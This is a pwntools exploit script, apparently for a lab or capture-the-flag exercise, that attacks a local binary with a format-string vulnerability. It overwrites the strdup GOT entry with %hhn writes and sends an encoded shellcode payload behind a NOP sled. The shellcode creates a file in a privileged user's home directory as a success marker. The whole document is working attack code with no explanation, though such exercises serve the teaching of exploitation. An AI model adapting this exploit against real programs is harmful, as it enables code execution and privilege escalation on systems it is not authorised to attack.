from pwn import *


e = context.binary = ELF('vuln_formatstring-entry')
p = process(executable=e.path, env={})


got_strdup = e.got['strdup']
plt_strdup = e.plt['strdup'] + 6
print(hex(got_strdup))
print(hex(plt_strdup))

#overwrite
s = p32(got_strdup+3) #b'\x7f\x99\x04\x08'
s += b'....'
s += p32(got_strdup+1) #b'\x7d\x99\x04\x08'
s += b'....'
s += p32(got_strdup+2) #b'\x7e\x99\x04\x08'
s += b'....'
s += p32(got_strdup) #b'\x7c\x99\x04\x08'
s += b'%227c%hhn%218c%hhn%38c%hhn%1c%hhn'

successFile = "/home/privileged/formatstring-entry"
#shellcode
#shellcode = shellcraft.echo(b'success')
shellcode = shellcraft.pushstr(successFile)
shellcode += shellcraft.syscall('SYS_open', 'esp', 'O_CREAT | O_WRONLY', 777)
shellcode += shellcraft.echo('success', 'eax')
shellcode += shellcraft.exit(69);


assembly = encoders.encode(asm(shellcode), avoid=b'\xfe\x00\n\r')

padlen = 2000 - (len(assembly) + len(s))
payload = s + asm(shellcraft.nop())*padlen + assembly

print(len(payload))
print(hexdump(payload))
p.sendline(payload)
data = p.recvall()
print(data)
